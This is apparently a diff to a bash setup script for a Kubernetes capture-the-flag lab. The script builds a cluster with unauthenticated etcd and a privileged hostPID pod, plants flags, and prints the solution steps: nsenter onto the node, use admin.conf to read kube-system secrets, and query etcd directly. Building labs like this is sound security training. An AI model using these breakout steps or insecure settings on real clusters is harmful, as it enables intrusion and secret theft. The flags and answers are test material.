@@ -1,9 +1,9 @@
 #!/bin/bash
-# Chain 10: Privileged Breakout → RBAC → etcd (3 steps)
+# Chain 10: Privileged Breakout → Node shell → etcd (3 steps)
 set -euo pipefail
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-ROOT="$(dirname "$(dirname "$SCRIPT_DIR")")"
+K8S_ID="chain10"
 CLUSTER_NAME="cve-chain10-priv-etcd"
+source "$(dirname "$0")/../../scripts/k8s-common.sh"
 FLAG1="flag{chain10-step1-priv}"
 FLAG2="flag{chain10-step2-rbac}"
 FLAG3="flag{chain10-step3-etcd-final}"
@@ -22,10 +22,6 @@ nodes:
     extraMounts:
       - hostPath: /home/kianabin/cve-flags/chain10
         containerPath: /host-flag
-    extraPortMappings:
-      - containerPort: 2379
-        hostPort: 11379
-        protocol: TCP
     kubeadmConfigPatches:
       - |
         kind: ClusterConfiguration
@@ -33,33 +29,47 @@ nodes:
           local:
             extraArgs:
               client-cert-auth: "false"
-
 KINDCFG
 
-docker pull alpine:latest 2>/dev/null; kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true
-kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true; sleep 10
+docker pull bitnami/kubectl:1.28 2>/dev/null
+kind load docker-image bitnami/kubectl:1.28 --name "$CLUSTER_NAME" 2>/dev/null || true
+kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
+sleep 10
 
-# Step 1: Privileged pod
+# Step 1: privileged + hostPID pod (flag on the node, NOT mounted)
 kubectl apply -f - << YAML
 apiVersion: v1
 kind: Pod
-metadata: {name: chain10-step1}
+metadata:
+  name: chain10-step1
 spec:
+  hostPID: true
   containers:
-    - {name: escape, image: alpine:latest, imagePullPolicy: IfNotPresent, command: ["sleep","3600"],
-       securityContext: {privileged: true},
-       volumeMounts: [{name: hf, mountPath: /host-flag}]}
-  volumes: [{name: hf, hostPath: {path: /host-flag, type: Directory}}]
+    - name: escape
+      image: bitnami/kubectl:1.28
+      imagePullPolicy: IfNotPresent
+      command: ["sleep", "3600"]
+      securityContext:
+        privileged: true
 YAML
 
-# Step 2: RBAC + secrets
-kubectl create sa chain10-sa -n default
-kubectl create clusterrole chain10-reader --verb=get --verb=list --resource=secrets
-kubectl create clusterrolebinding chain10-binding --clusterrole=chain10-reader --serviceaccount=default:chain10-sa
-kubectl create secret generic chain10-step2 --from-literal=flag="$FLAG2" -n kube-system
-kubectl create secret generic chain10-step3 --from-literal=flag="$FLAG3" -n kube-system
+# Step 2 flag: kube-system secret readable only from a node shell (admin.conf)
+kubectl create secret generic chain10-step2 --from-literal=flag="$FLAG2" -n kube-system 2>/dev/null || true
 
+# Step 3 final flag: written into the REAL etcd under a custom key
+# (invisible to the Kubernetes API -> no kubectl shortcut)
+k8s_put_etcd_key "/chain10-final" "$FLAG3"
+
+kubectl wait --for=condition=Ready pod/chain10-step1 --timeout=60s 2>/dev/null || true
+sleep 5
+
+echo ""
 echo "[Chain 10] Ready"
-echo "  Step 1: kubectl exec chain10-step1 -- cat /host-flag/flag.txt → $FLAG1"
-echo "  Step 2: SA token → kubectl get secret chain10-step2 -n kube-system → $FLAG2"
-echo "  Step 3: etcdctl --endpoints=localhost:11379 get /registry/secrets/kube-system/chain10-step3"
+echo "    Step 1: kubectl exec chain10-step1 -- nsenter --target 1 --mount -- cat /host-flag/flag.txt"
+echo "    Step 2: copy kubectl into the host and use admin.conf:"
+echo "       kubectl exec chain10-step1 -- sh -c 'cp /opt/bitnami/kubectl/bin/kubectl /proc/1/root/usr/local/bin/kubectl'"
+echo "       kubectl exec chain10-step1 -- nsenter --target 1 --mount --net -- sh -c \\"
+echo "         'KUBECONFIG=/etc/kubernetes/admin.conf kubectl get secret chain10-step2 -n kube-system -o jsonpath={.data.flag} | base64 -d'"
+echo "    Step 3: from the node shell read the custom etcd key (install curl if missing):"
+echo "       kubectl exec chain10-step1 -- nsenter --target 1 --mount --net -- sh -c \\"
+echo "         'curl -sk -X POST https://127.0.0.1:2379/v3/kv/range -H \"Content-Type: application/json\" -d \"{\\\"key\\\":\\\"$(printf /chain10-final | base64 -w0)\\\"}\"'"
